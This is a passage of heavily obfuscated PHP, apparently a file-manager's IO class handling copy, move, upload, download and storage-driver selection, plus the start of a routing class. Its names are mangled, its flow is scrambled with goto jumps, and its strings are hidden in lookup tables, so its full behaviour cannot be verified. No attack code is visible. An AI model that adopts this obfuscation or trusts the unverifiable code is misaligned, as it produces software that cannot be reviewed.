$D³¨¶¡ñô) { $Cî“‹¡Íğ‘ =& $_SERVER[¼]; $bõ¶½ô¯ô = str_replace(array($Cî“‹¡Íğ‘[986], $Cî“‹¡Íğ‘[987]), array($Cî“‹¡Íğ‘[985], $Cî“‹¡Íğ‘[214]), $bõ¶½ô¯ô); if ($D³¨¶¡ñô == $Cî“‹¡Íğ‘[9]) { $bõ¶½ô¯ô = stripslashes($bõ¶½ô¯ô); } return $bõ¶½ô¯ô; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($cÕ¬‘‘‚Ø, $eÊŸ–Ğ‹¶«) { $B›ØÛà¨ = self::driverMake($eÊŸ–Ğ‹¶«[0]); if (method_exists($B›ØÛà¨, $cÕ¬‘‘‚Ø)) { return @call_user_func_array(array($B›ØÛà¨, $cÕ¬‘‘‚Ø), $eÊŸ–Ğ‹¶«); } if (method_exists($B›ØÛà¨, $_SERVER[¼][990])) { return @call_user_func_array(array($B›ØÛà¨, $cÕ¬‘‘‚Ø), $eÊŸ–Ğ‹¶«); } else { if (method_exists(self, $cÕ¬‘‘‚Ø)) { return @call_user_func_array(array(self, $cÕ¬‘‘‚Ø), $eÊŸ–Ğ‹¶«); } else { call_user_func_array(array(parent, $cÕ¬‘‘‚Ø), $eÊŸ–Ğ‹¶«); } } } public static function init($dá£…³³¢ª) { return self::driverMake($dá£…³³¢ª); } public static function copy($eˆ­í‡§‡î, $AÙöÙØ½Ü, $f¶Î—“×–Â = false, $b‰·÷‡ƒÉ = false) { return self::copyMove($eˆ­í‡§‡î, $AÙöÙØ½Ü, $f¶Î—“×–Â, $_SERVER[¼][486], $b‰·÷‡ƒÉ); } public static function move($D«±áÒµÍ—, $AàÏÈ‰°ø‘, $Eì‘è­Š‹› = false, $AÙƒì¶Æèº = false) { return self::copyMove($D«±áÒµÍ—, $AàÏÈ‰°ø‘, $Eì‘è­Š‹›, $_SERVER[¼][488], $AÙƒì¶Æèº); } public static function saveFile($BèÜ¼‚ª©¨, $BÁââƒ…‚, $FÄ™“…ÀÆ¸ = true) { goto cáºÎŸˆŸç; C³¾ˆ²öÌ¾: $Aö×ÜĞÛé” = $BÂÜºŞ –º->pathFather($BÁââƒ…‚); $A«˜£˜‚Šá = !0; if (!$FÄ™“…ÀÆ¸ && self::driverIsSame($cšãùÛ¼™é, $BÂÜºŞ –º)) { $A«˜£˜‚Šá = !1; } goto d¿­´³Ô–Î; d‰Œ…’ İ: $BÂÜºŞ –º = self::driverMake($BÁââƒ…‚); $c±†È¼²Åñ = !1; if ($BÂÜºŞ –º->pathParse[$a°åä¿ø[991]]) { $C…ˆ·šæ‘ = $BÂÜºŞ –º->pathParse[$a°åä¿ø[991]]; $c±†È¼²Åñ = $BÂÜºŞ –º; $BÂÜºŞ –º = self::driverMake($C…ˆ·šæ‘); } goto C³¾ˆ²öÌ¾; cáºÎŸˆŸç: $a°åä¿ø =& $_SERVER[¼]; $aù ¨‡É® = self::info($BÁââƒ…‚); $cšãùÛ¼™é = self::driverMake($BèÜ¼‚ª©¨); goto d‰Œ…’ İ; d¿­´³Ô–Î: $b‹Ì¬ôáš‹ = self::copyFile($cšãùÛ¼™é, $BèÜ¼‚ª©¨, $BÂÜºŞ –º, $Aö×ÜĞÛé”, $aù ¨‡É®[$a°åä¿ø[28]], $A«˜£˜‚Šá); if ($c±†È¼²Åñ) { $b‹Ì¬ôáš‹ = $c±†È¼²Åñ->getPathOuter($b‹Ì¬ôáš‹); } return $b‹Ì¬ôáš‹; goto aãÏ‹Ô‚; aãÏ‹Ô‚: } private static function copyMove($BàèÑÓ§Œ‚, $BàéØö¾·Ó, $fĞ«Àº”ŸÖ, $aÁ—¿Ö…„, $C»§è‡¢· = false) { goto F‚Å¡ÅÆ‘Ö; BÃç™ç²è: $fêğ¡ê¯ç = self::driverMake($BàèÑÓ§Œ‚); $cğÃåÊ©î = self::driverMake($BàéØö¾·Ó); $b‚Äá³‡ÀÇ = $aÁ—¿Ö…„ == $EÙ¯Áø¯ˆí[488]; goto Fˆ„’…éãà; a²õçÍßí: if ($DÃÎõŒçò) { $c¸çœêÉß = $DÃÎõŒçò->getPathOuter($c¸çœêÉß); } return $c¸çœêÉß; goto dóÉ¡©‚; Fˆ„’…éãà: $DÃÎõŒçò = !1; if ($cğÃåÊ©î->pathParse[$EÙ¯Áø¯ˆí[991]]) { $BàéØö¾·Ó = $cğÃåÊ©î->pathParse[$EÙ¯Áø¯ˆí[991]]; $DÃÎõŒçò = $cğÃåÊ©î; $cğÃåÊ©î = self::driverMake($BàéØö¾·Ó); } self::check($fêğ¡ê¯ç, $BàèÑÓ§Œ‚, $cğÃåÊ©î, $BàéØö¾·Ó); goto AÑ–Úø§ğê; Dµ…À·îœ•: $B¤ÃÑ‚ßåç = $fêğ¡ê¯ç->isFile($BàèÑÓ§Œ‚); if (!$B¤ÃÑ‚ßåç && $cğÃåÊ©î->getType() == $EÙ¯Áø¯ˆí[686] && $fêğ¡ê¯ç->getType() == $EÙ¯Áø¯ˆí[103]) { $c¸çœêÉß = $cğÃåÊ©î->copyFolderFromIO($fêğ¡ê¯ç, $BàèÑÓ§Œ‚, $BàéØö¾·Ó, $fĞ«Àº”ŸÖ, $b‚Äá³‡ÀÇ, $C»§è‡¢·); } else { $c¸çœêÉß = self::copyPath($fêğ¡ê¯ç, $BàèÑÓ§Œ‚, $cğÃåÊ©î, $BàéØö¾·Ó, $fĞ«Àº”ŸÖ, $b‚Äá³‡ÀÇ, $B¤ÃÑ‚ßåç, $C»§è‡¢·); } if ($c¸çœêÉß && $b‚Äá³‡ÀÇ) { $fêğ¡ê¯ç->remove($BàèÑÓ§Œ‚); } goto a²õçÍßí; F‚Å¡ÅÆ‘Ö: $EÙ¯Áø¯ˆí =& $_SERVER[¼]; if (!$BàèÑÓ§Œ‚ || $BàèÑÓ§Œ‚ == $EÙ¯Áø¯ˆí[8] || !$BàéØö¾·Ó) { return !1; } ignore_timeout(); goto BÃç™ç²è; AÑ–Úø§ğê: Hook::trigger($EÙ¯Áø¯ˆí[72], $fêğ¡ê¯ç, $BàèÑÓ§Œ‚, $cğÃåÊ©î, $BàéØö¾·Ó); $AœĞààÌ¾ = self::driverIsSame($fêğ¡ê¯ç, $cğÃåÊ©î); if ($AœĞààÌ¾) { if ($aÁ—¿Ö…„ == $EÙ¯Áø¯ˆí[488] && trim($BàéØö¾·Ó, $EÙ¯Áø¯ˆí[8]) == trim($cğÃåÊ©î->pathFather($BàèÑÓ§Œ‚), $EÙ¯Áø¯ˆí[8])) { return $cğÃåÊ©î->getPathOuter($BàèÑÓ§Œ‚); } if (method_exists($cğÃåÊ©î, $aÁ—¿Ö…„)) { return $cğÃåÊ©î->{$aÁ—¿Ö…„}($BàèÑÓ§Œ‚, $BàéØö¾·Ó, $fĞ«Àº”ŸÖ); } } goto Dµ…À·îœ•; dóÉ¡©‚: } private static function check($E­ì±æç£‰, $bñ®Š‡ª¦, $b°®ÄÃï”…, &$D»Äùá ²Á) { $c„Õ›æíœ± =& $_SERVER[¼]; if (self::driverIsSame($E­ì±æç£‰, $b°®ÄÃï”…) && $E­ì±æç£‰->isFolder($bñ®Š‡ª¦) && $E­ì±æç£‰->isParentOf($bñ®Š‡ª¦, $D»Äùá ²Á)) { show_json(LNG($c„Õ›æíœ±[992]), !1); } if (!$E­ì±æç£‰->exist($bñ®Š‡ª¦)) { show_json(LNG($c„Õ›æíœ±[102]), !1); } } private static function copyPath($B„¶œ÷ôÍÎ, $AŸ…ïŠƒë, $BÛ¡¥è˜Ô, $e¡ˆÂÜ†­ö, $bß–ì¬Á…, $CÖò‰ÈÊŠ, $eÄÚÂø·¬³, $bµÂ•Ñ¬Áº = false) { goto aî¦ñÖÏÀõ; CšÙÚß„³: $EÓÏÆ¶‰È = $BÛ¡¥è˜Ô->mkdir($BÛ¡¥è˜Ô->getPath($e¢‘£ ®†Ÿ)); $e¡ˆÂÜ†­ö = $BÛ¡¥è˜Ô->getPathInner($EÓÏÆ¶‰È); $CÂß³ñ§ = $B„¶œ÷ôÍÎ->listPath($AŸ…ïŠƒë, !0); goto bò‰†Ìì“Š; bò‰†Ìì“Š: $aÎôÁß”è— = array_merge($CÂß³ñ§[$A¢ãø§ø—Ô[73]], $CÂß³ñ§[$A¢ãø§ø—Ô[74]]); foreach ($aÎôÁß”è— as $AÌ–‡šÈ©±) { $e…¥è­ŒŠŠ = $AÌ–‡šÈ©±[$A¢ãø§ø—Ô[29]] == $A¢ãø§ø—Ô[164]; $AŸ…ïŠƒë = $B„¶œ÷ôÍÎ->getPathInner($AÌ–‡šÈ©±[$A¢ãø§ø—Ô[75]]); $A™–‘™¨ß° = self::copyPath($B„¶œ÷ôÍÎ, $AŸ…ïŠƒë, $BÛ¡¥è˜Ô, $e¡ˆÂÜ†­ö, $bß–ì¬Á…, $CÖò‰ÈÊŠ, $e…¥è­ŒŠŠ); if (!$A™–‘™¨ß°) { write_log($A¢ãø§ø—Ô[993] . $AŸ…ïŠƒë . $A¢ãø§ø—Ô[994] . $e¡ˆÂÜ†­ö, $A¢ãø§ø—Ô[995]); } } return $EÓÏÆ¶‰È; goto E›ˆˆåäĞù; aî¦ñÖÏÀõ: $A¢ãø§ø—Ô =& $_SERVER[¼]; $D‹îİÌ¶‡ = $bµÂ•Ñ¬Áº ? $bµÂ•Ñ¬Áº : $B„¶œ÷ôÍÎ->getPathName($B„¶œ÷ôÍÎ->pathThis($AŸ…ïŠƒë)); if ($bß–ì¬Á…) { $B²³·¬À„´ = $BÛ¡¥è˜Ô->fileNameExist($e¡ˆÂÜ†­ö, $D‹îİÌ¶‡); $D‹îİÌ¶‡ = $BÛ¡¥è˜Ô->fileNameAuto($e¡ˆÂÜ†­ö, $D‹îİÌ¶‡, $bß–ì¬Á…, !$eÄÚÂø·¬³); $bß–ì¬Á… = $B²³·¬À„´ ? $bß–ì¬Á… : !1; } goto C†ã¥İº³; C†ã¥İº³: if ($eÄÚÂø·¬³) { return self::copyFile($B„¶œ÷ôÍÎ, $AŸ…ïŠƒë, $BÛ¡¥è˜Ô, $e¡ˆÂÜ†­ö, $D‹îİÌ¶‡, $CÖò‰ÈÊŠ); } if ($bß–ì¬Á… == REPEAT_RENAME_FOLDER) { $bß–ì¬Á… = !1; } $e¢‘£ ®†Ÿ = rtrim($e¡ˆÂÜ†­ö, $A¢ãø§ø—Ô[8]) . $A¢ãø§ø—Ô[8] . $D‹îİÌ¶‡; goto CšÙÚß„³; E›ˆˆåäĞù: } private static function copyFile($EÚ×›ø«, $aÎÔ¥¥èª, $fœ—Ã÷™®, $DÆÇ‡³øç, $CŠÏå©Ô’®, $c·ğ£Ç¡è) { goto bÁ¹¨ÎÅé; DùÎ¦ô—Ñ•: Hook::trigger($d¶Ï‚Èƒ¹»[997], $EÚ×›ø«, $aÎÔ¥¥èª, $fœ—Ã÷™®, $DÆÇ‡³øç, $CŠÏå©Ô’®, $C†öãº‡‚á); if (self::driverIsSame($EÚ×›ø«, $fœ—Ã÷™®)) { if ($c·ğ£Ç¡è) { $Dç¡¾âÒò = $fœ—Ã÷™®->moveFile($aÎÔ¥¥èª, $DÆÇ‡³øç); } else { $Dç¡¾âÒò = $fœ—Ã÷™®->copyFile($aÎÔ¥¥èª, $DÆÇ‡³øç); } Hook::trigger($d¶Ï‚Èƒ¹»[998], $EÚ×›ø«, $aÎÔ¥¥èª, $fœ—Ã÷™®, $DÆÇ‡³øç, $CŠÏå©Ô’®, $Dç¡¾âÒò); return $Dç¡¾âÒò; } $aËíÚ¼° = TEMP_FILES; goto bÚØ’ÊòÍš; C½ƒƒ¤Ÿ: $D­ğÆ÷¯Ú = $EÚ×›ø«->iconvApp($D­ğÆ÷¯Ú); $Dç¡¾âÒò = $fœ—Ã÷™®->upload($DÆÇ‡³øç, $D­ğÆ÷¯Ú, $c·ğ£Ç¡è); self::remove($aËíÚ¼° . $C†öãº‡‚á); goto a¥äÃ‘‚; a¥äÃ‘‚: Hook::trigger($d¶Ï‚Èƒ¹»[998], $EÚ×›ø«, $aÎÔ¥¥èª, $fœ—Ã÷™®, $DÆÇ‡³øç, $CŠÏå©Ô’®, $Dç¡¾âÒò); return $Dç¡¾âÒò; goto dŠšÙ èª½; bÚØ’ÊòÍš: mk_dir($aËíÚ¼°); $D­ğÆ÷¯Ú = $aËíÚ¼° . $C†öãº‡‚á; $D­ğÆ÷¯Ú = $EÚ×›ø«->download($aÎÔ¥¥èª, $D­ğÆ÷¯Ú); goto C½ƒƒ¤Ÿ; bÁ¹¨ÎÅé: $d¶Ï‚Èƒ¹» =& $_SERVER[¼]; $DÆÇ‡³øç = $fœ—Ã÷™®->getPath(rtrim($DÆÇ‡³øç, $d¶Ï‚Èƒ¹»[8]) . $d¶Ï‚Èƒ¹»[8] . $CŠÏå©Ô’®); $C†öãº‡‚á = $d¶Ï‚Èƒ¹»[996] . time() . rand_string(5); goto DùÎ¦ô—Ñ•; dŠšÙ èª½: } public static function pathFather($E†¸†İç¶È) { $aôôÒò–¶ô = IO::init($E†¸†İç¶È); $f©†ŠÑÏ¡ = $aôôÒò–¶ô->pathFather($aôôÒò–¶ô->path); return $aôôÒò–¶ô->getPathOuter($f©†ŠÑÏ¡); } public static function fileOut($bèÙ–±ä¾ì, $d¿Ã±”ğŒ† = false, $E‡›èŸ Áæ = false, $fñ•ôµ·Ù = '') { $eÉœŸ—–²Ë = self::driverMake($bèÙ–±ä¾ì); if ($eÉœŸ—–²Ë->isFileOutServer()) { return $eÉœŸ—–²Ë->fileOutServer($bèÙ–±ä¾ì, $d¿Ã±”ğŒ†, $E‡›èŸ Áæ, $fñ•ôµ·Ù); } return $eÉœŸ—–²Ë->fileOut($bèÙ–±ä¾ì, $d¿Ã±”ğŒ†, $E‡›èŸ Áæ, $fñ•ôµ·Ù); } public static function fileOutImage($D§‡¹ï§µ, $E…Ñ ‹¤ = 250) { $CÅÜëÒ˜©  = array(250, 600, 1200, 3000); for ($Bêô›°«èæ = 0; $Bêô›°«èæ < count($CÅÜëÒ˜© ); $Bêô›°«èæ++) { if ($Bêô›°«èæ == 0 && $E…Ñ ‹¤ <= $CÅÜëÒ˜© [$Bêô›°«èæ]) { $E…Ñ ‹¤ = $CÅÜëÒ˜© [$Bêô›°«èæ]; break; } else { if ($E…Ñ ‹¤ > $CÅÜëÒ˜© [$Bêô›°«èæ - 1] && $E…Ñ ‹¤ <= $CÅÜëÒ˜© [$Bêô›°«èæ]) { $E…Ñ ‹¤ = $CÅÜëÒ˜© [$Bêô›°«èæ]; break; } else { if ($Bêô›°«èæ == count($CÅÜëÒ˜© ) - 1 && $E…Ñ ‹¤ > $CÅÜëÒ˜© [$Bêô›°«èæ]) { $E…Ñ ‹¤ = $CÅÜëÒ˜© [$Bêô›°«èæ]; break; } } } } $EˆÒæ“¦ã = self::driverMake($D§‡¹ï§µ); if ($EˆÒæ“¦ã->isFileOutServer()) { return $EˆÒæ“¦ã->fileOutImageServer($D§‡¹ï§µ, $E…Ñ ‹¤); } return $EˆÒæ“¦ã->fileOutImage($D§‡¹ï§µ, $E…Ñ ‹¤); } private static function driverIsSame($C…Ê²‚¹Ğ—, $BŸ‚Ü“ƒ©õ) { goto BÍÑÇØñ¡Ò; BñëõÌ¿¸‘: if ($C…Ê²‚¹Ğ—->pathDriver == $BŸ‚Ü“ƒ©õ->pathDriver) { return !0; } return !1; goto A²§¢óÒˆá; cº¥øÅš¦: if ($d ‚±® != $BËÔòõâçŒ) { return !1; } if ($d ‚±® == $aå°Ï¥‘É°[686]) { return !0; } if ($d ‚±® == $aå°Ï¥‘É°[103]) { return !0; } goto BñëõÌ¿¸‘; BÍÑÇØñ¡Ò: $aå°Ï¥‘É° =& $_SERVER[¼]; $d ‚±® = $C…Ê²‚¹Ğ—->getType(); $BËÔòõâçŒ = $BŸ‚Ü“ƒ©õ->getType(); goto cº¥øÅš¦; A²§¢óÒˆá: } public static function copyUpdate($c•„å©î—, $c…ÙŒ…—ò†) { goto fø’„áÑ…ù; fø’„áÑ…ù: $Aù­Á¸ÈÎ =& $_SERVER[¼]; if (!IO::exist($c•„å©î—)) { return !1; } if (!IO::exist($c…ÙŒ…—ò†)) { IO::mkdir($c…ÙŒ…—ò†); } goto aí²ÈƒŠàÉ; cÌ¢ËÌŸ†¹: Hook::trigger($Aù­Á¸ÈÎ[1002], $c•„å©î—, $c…ÙŒ…—ò†, $F³¼§ÊÇË‹); foreach ($Aå—¼ñ—‹¿ as $AïœÚ°™‡±) { IO::mkdir($AïœÚ°™‡±); } foreach ($Bˆ¾ˆ¸ïê as $AïœÚ°™‡±) { IO::copy($AïœÚ°™‡±[$Aù­Á¸ÈÎ[999]], $AïœÚ°™‡±[$Aù­Á¸ÈÎ[1000]], REPEAT_REPLACE); } goto D•ìŒå‹Ğ„; aí²ÈƒŠàÉ: $fŒ´ëŸÕË¼ = self::_listAll($c•„å©î—); $fÏİ»óƒ–Ù = self::_listAll($c…ÙŒ…—ò†); $Bˆ¾ˆ¸ïê = array(); goto fäå›ßó“Ÿ; fäå›ßó“Ÿ: $Aå—¼ñ—‹¿ = array(); foreach ($fŒ´ëŸÕË¼ as $C©åŞßö‹× => $AïœÚ°™‡±) { if (isset($fÏİ»óƒ–Ù[$C©åŞßö‹×])) { if ($AïœÚ°™‡±[$Aù­Á¸ÈÎ[76]] == 1) { continue; } if ($fÏİ»óƒ–Ù[$C©åŞßö‹×][$Aù­Á¸ÈÎ[77]] == $AïœÚ°™‡±[$Aù­Á¸ÈÎ[77]]) { continue; } } if ($AïœÚ°™‡±[$Aù­Á¸ÈÎ[76]] == 1) { $Aå—¼ñ—‹¿[] = $c…ÙŒ…—ò† . $Aù­Á¸ÈÎ[8] . $C©åŞßö‹×; continue; } $dô´¥ÅØÜ = strstr(trim($C©åŞßö‹×, $Aù­Á¸ÈÎ[8]), $Aù­Á¸ÈÎ[8]) ? get_path_father($C©åŞßö‹×) : $Aù­Á¸ÈÎ[33]; $Bˆ¾ˆ¸ïê[] = array($Aù­Á¸ÈÎ[999] => $AïœÚ°™‡±[$Aù­Á¸ÈÎ[75]], $Aù­Á¸ÈÎ[1000] => rtrim($c…ÙŒ…—ò†, $Aù­Á¸ÈÎ[8]) . $Aù­Á¸ÈÎ[8] . $dô´¥ÅØÜ, $Aù­Á¸ÈÎ[1001] => $AïœÚ°™‡±); } $F³¼§ÊÇË‹ = array($Aù­Á¸ÈÎ[164] => $Bˆ¾ˆ¸ïê, $Aù­Á¸ÈÎ[76] => $Aå—¼ñ—‹¿); goto cÌ¢ËÌŸ†¹; D•ìŒå‹Ğ„: } private static function _listAll($F˜­šì±¾) { $dÃš…¸àŒ¢ =& $_SERVER[¼]; $F˜­šì±¾ = KodIO::clear($F˜­šì±¾); $aÕ×àĞ„¥ƒ = IO::listAll($F˜­šì±¾); foreach ($aÕ×àĞ„¥ƒ as &$Aœ´ÜÒ÷) { $a»›êš¥™ = substr($Aœ´ÜÒ÷[$dÃš…¸àŒ¢[75]], strlen($F˜­šì±¾)); $Aœ´ÜÒ÷[$dÃš…¸àŒ¢[1003]] = trim($a»›êš¥™, $dÃš…¸àŒ¢[8]); } return array_to_keyvalue($aÕ×àĞ„¥ƒ, $dÃš…¸àŒ¢[1003]); } public static function fileSubstr($AĞŠ ˆ¶ ƒ, $F¤àË³ÀÄª, $EóùøÜ™‚ó = false) { goto d°ŒõÜÔÛì; BÓ¦º¥ˆÖÇ: if ($F¤àË³ÀÄª + $EóùøÜ™‚ó > $bÇ­¶´) { $EóùøÜ™‚ó = $bÇ­¶´ - $F¤àË³ÀÄª; } if ($EóùøÜ™‚ó <= 0) { return $_SERVER[¼][33]; } if ($F¤àË³ÀÄª < 0 || $F¤àË³ÀÄª >= $bÇ­¶´ || $EóùøÜ™‚ó > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\x65\122\145\x61\x64\x20\145\x72\x72\157\x72\41\x20\163\164\x61\x72\x74\75{$F¤àË³ÀÄª}\73\x6c\x65\x6e\x67\164\150\75{$EóùøÜ™‚ó}\x3b\40\x73\151\172\145\x3d{$bÇ­¶´}\73"); } goto e¥‹İèº†ç; BŞˆ‚÷¨‚¸: $c¡Õæº™« = $EóùøÜ™‚ó; if ($F¤àË³ÀÄª < 0) { $F¤àË³ÀÄª = $bÇ­¶´ + $F¤àË³ÀÄª; } if ($EóùøÜ™‚ó === !1) { $EóùøÜ™‚ó = $bÇ­¶´ - $F¤àË³ÀÄª; } goto BÓ¦º¥ˆÖÇ; d°ŒõÜÔÛì: $b´Ø„áí­õ = self::driverMake($AĞŠ ˆ¶ ƒ); $bÇ­¶´ = $b´Ø„áí­õ->size($AĞŠ ˆ¶ ƒ); $d½íŒŞèä‘ = $F¤àË³ÀÄª; goto BŞˆ‚÷¨‚¸; e¥‹İèº†ç: return $b´Ø„áí­õ->fileSubstr($AĞŠ ˆ¶ ƒ, $F¤àË³ÀÄª, $EóùøÜ™‚ó); goto DÜ£Ä›š; DÜ£Ä›š: } private static function driverMake(&$Cœ¾âµ™) { goto aÅŠ²½°Šš; aÅŠ²½°Šš: $FêÖ˜©›Ú¥ =& $_SERVER[¼]; $a¹–Ç¾‡ë˜ = KodIO::parse($Cœ¾âµ™); if (!self::$driverListSystem) { $dØ±™…¦‚• = Model($FêÖ˜©›Ú¥[696])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($dØ±™…¦‚•, $FêÖ˜©›Ú¥[364]); } goto fÂÆµàö©; fÂÆµàö©: if ($a¹–Ç¾‡ë˜[$FêÖ˜©›Ú¥[29]] == KodIO::KOD_IO && !self::$driverListSystem[$a¹–Ç¾‡ë˜[$FêÖ˜©›Ú¥[364]]]) { return !1; } $Cœ¾âµ™ = $a¹–Ç¾‡ë˜[$FêÖ˜©›Ú¥[1004]]; $D…Ø‘õ¬è‚ = self::driverGet($a¹–Ç¾‡ë˜, $Cœ¾âµ™); goto fø‰ËËÉ¾‘; fø‰ËËÉ¾‘: return $D…Ø‘õ¬è‚; goto Báé¡ì›¢ô; Báé¡ì›¢ô: } private static function driverGet($D¦»’ĞÈñá, &$cÎñæˆ÷¯) { goto c¨ïĞ°ô¯÷; cã¨ŒøÍ¿×: switch ($D¦»’ĞÈñá[$bôÔ©Ë£¦[29]]) { case KodIO::KOD_IO: $b¼íôÃ„ÏË = self::$driverListSystem[$F„ùº½¡]; break; case KodIO::KOD_SOURCE: $cÎñæˆ÷¯ = $F„ùº½¡ . $cÎñæˆ÷¯; $b¼íôÃ„ÏË = array($bôÔ©Ë£¦[1006] => $bôÔ©Ë£¦[1007], $bôÔ©Ë£¦[6] => $D¦»’ĞÈñá); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $bâÉ„Öïã = $GLOBALS[$bôÔ©Ë£¦[1008]]; self::$driverListUser = array_to_keyvalue($bâÉ„Öïã, $bôÔ©Ë£¦[364]); } $b¼íôÃ„ÏË = self::$driverListUser[$F„ùº½¡]; break; case KodIO::KOD_SHARE_LINK: $b¼íôÃ„ÏË = array($bôÔ©Ë£¦[1006] => $bôÔ©Ë£¦[1009], $bôÔ©Ë£¦[6] => $D¦»’ĞÈñá); $b–Œµèµ¢É = Action($bôÔ©Ë£¦[1010])->sharePathInfo($D¦»’ĞÈñá[$bôÔ©Ë£¦[75]]); $cÎñæˆ÷¯ = $b–Œµèµ¢É[$bôÔ©Ë£¦[366]]; if (!$b–Œµèµ¢É[$bôÔ©Ë£¦[366]]) { $a©ù’”“­ê = Model($bôÔ©Ë£¦[532])->getInfo($b–Œµèµ¢É[$bôÔ©Ë£¦[437]]); $cÎñæˆ÷¯ = KodIO::clear($a©ù’”“­ê[$bôÔ©Ë£¦[1011]] . $D¦»’ĞÈñá[$bôÔ©Ë£¦[1004]]); $D¦»’ĞÈñá[$bôÔ©Ë£¦[435]] = $a©ù’”“­ê; $D¦»’ĞÈñá[$bôÔ©Ë£¦[991]] = $cÎñæˆ÷¯; $b¼íôÃ„ÏË = array($bôÔ©Ë£¦[1006] => $bôÔ©Ë£¦[1012], $bôÔ©Ë£¦[6] => $D¦»’ĞÈñá); } break; case KodIO::KOD_SHARE_ITEM: $b¼íôÃ„ÏË = array($bôÔ©Ë£¦[1006] => $bôÔ©Ë£¦[1013], $bôÔ©Ë£¦[6] => $D¦»’ĞÈñá); $a©ù’”“­ê = Model($bôÔ©Ë£¦[532])->getInfo($D¦»’ĞÈñá[$bôÔ©Ë£¦[364]]); if ($a©ù’”“­ê[$bôÔ©Ë£¦[366]] == $bôÔ©Ë£¦[464]) { $cÎñæˆ÷¯ = KodIO::clear($a©ù’”“­ê[$bôÔ©Ë£¦[1011]] . $D¦»’ĞÈñá[$bôÔ©Ë£¦[1004]]); $D¦»’ĞÈñá[$bôÔ©Ë£¦[435]] = $a©ù’”“­ê; $D¦»’ĞÈñá[$bôÔ©Ë£¦[991]] = $cÎñæˆ÷¯; $b¼íôÃ„ÏË = array($bôÔ©Ë£¦[1006] => $bôÔ©Ë£¦[1014], $bôÔ©Ë£¦[6] => $D¦»’ĞÈñá); } break; default: $cÎñæˆ÷¯ = $D¦»’ĞÈñá[$bôÔ©Ë£¦[75]]; $b¼íôÃ„ÏË = array($bôÔ©Ë£¦[1006] => $bôÔ©Ë£¦[1015]); break; } $B£ÍŸ ±ñİ = $D¦»’ĞÈñá[$bôÔ©Ë£¦[75]]; if (!isset(self::$driverCache[$B£ÍŸ ±ñİ])) { $dëÄì¯Èİ† = strtolower($b¼íôÃ„ÏË[$bôÔ©Ë£¦[90]]); $a„ÜÀïìŸ = $GLOBALS[$bôÔ©Ë£¦[6]][$bôÔ©Ë£¦[84]][$bôÔ©Ë£¦[1016]]; $dÎŠôí¢°Ş = $bôÔ©Ë£¦[71] . (isset($a„ÜÀïìŸ[$dëÄì¯Èİ†]) ? $a„ÜÀïìŸ[$dëÄì¯Èİ†] : ucfirst($dëÄì¯Èİ†)); if (!class_exists($dÎŠôí¢°Ş)) { show_json("{$dÎŠôí¢°Ş}\40\x6e\157\164\40\145\x78\x69\x73\x74\163\41", !1); } $E–èâÏÇ¨ê = isset($b¼íôÃ„ÏË[$bôÔ©Ë£¦[6]]) ? $b¼íôÃ„ÏË[$bôÔ©Ë£¦[6]] : !1; self::$driverCache[$B£ÍŸ ±ñİ] = new $dÎŠôí¢°Ş($E–èâÏÇ¨ê); } goto C¤¼èÕœ; FÎ¶Œì±†ƒ: if (isset($b¼íôÃ„ÏË[$bôÔ©Ë£¦[6]][$bôÔ©Ë£¦[1017]])) { $fÊŞêˆá¥ğ->pathBase = rtrim($b¼íôÃ„ÏË[$bôÔ©Ë£¦[6]][$bôÔ©Ë£¦[1017]], $bôÔ©Ë£¦[8]) . $bôÔ©Ë£¦[8]; $cÎñæˆ÷¯ = $fÊŞêˆá¥ğ->pathBase . ltrim($cÎñæˆ÷¯, $bôÔ©Ë£¦[8]); } $cÎñæˆ÷¯ = $fÊŞêˆá¥ğ->getPath($cÎñæˆ÷¯); if (isset($D¦»’ĞÈñá[$bôÔ©Ë£¦[991]])) { $cÎñæˆ÷¯ = $D¦»’ĞÈñá[$bôÔ©Ë£¦[991]]; } goto Bâˆ†ÀóŞÓ; Bâˆ†ÀóŞÓ: $fÊŞêˆá¥ğ->path = $cÎñæˆ÷¯; return $fÊŞêˆá¥ğ; goto E²¤–ĞêÉ; C¤¼èÕœ: $fÊŞêˆá¥ğ = self::$driverCache[$B£ÍŸ ±ñİ]; $fÊŞêˆá¥ğ->pathDriver = $bšÍ„‰Û‰; $fÊŞêˆá¥ğ->pathBase = $bôÔ©Ë£¦[33]; goto FÎ¶Œì±†ƒ; c¨ïĞ°ô¯÷: $bôÔ©Ë£¦ =& $_SERVER[¼]; $bšÍ„‰Û‰ = $D¦»’ĞÈñá[$bôÔ©Ë£¦[1005]]; $F„ùº½¡ = $D¦»’ĞÈñá[$bôÔ©Ë£¦[364]]; goto cã¨ŒøÍ¿×; E²¤–ĞêÉ: } } goto FŠĞÒ†´‘§; c®Œ¬ÕÀ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\133\136\57\135\x2b", "\x3a\x6e\x75\x6d" => "\x5b\x30\55\x39\135\53", "\72\x61\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($eõîÕ±Ÿà, $FŠÇ¯áßõ´) { $aÅ¯”ƒ·÷ =& $_SERVER[¼]; if ($eõîÕ±Ÿà == $aÅ¯”ƒ·÷[1353]) { $f¾Û´Ë‚¯® = array_map($aÅ¯”ƒ·÷[1354], $FŠÇ¯áßõ´[0]); $fˆóÛ÷¢¹½ = strpos($FŠÇ¯áßõ´[1], $aÅ¯”ƒ·÷[8]) === 0 ? $FŠÇ¯áßõ´[1] : $aÅ¯”ƒ·÷[8] . $FŠÇ¯áßõ´[1]; $A¼ºƒ‚†î® = $FŠÇ¯áßõ´[2]; } else { $f¾Û´Ë‚¯® = null; $fˆóÛ÷¢¹½ = strpos($FŠÇ¯áßõ´[0], $aÅ¯”ƒ·÷[8]) === 0 ? $FŠÇ¯áßõ´[0] : $aÅ¯”ƒ·÷[8] . $FŠÇ¯áßõ´[0]; $A¼ºƒ‚†î® = $FŠÇ¯áßõ´[1]; } array_push(self::$maps, $f¾Û´Ë‚¯®); array_push(self::$routes, $fˆóÛ÷¢¹½); array_push(self::$methods, strtoupper($eõîÕ±Ÿà)); array_push(self::$callbacks, $A¼ºƒ‚†î®); } public static function error($F¹é“ƒõ¿‡) { self::$errorCallback = $F¹é“ƒõ¿‡; } public static function haltOnMatch($Eõ¯ÌÙÆÊ = true) { self::$halts = $Eõ¯ÌÙÆÊ; } 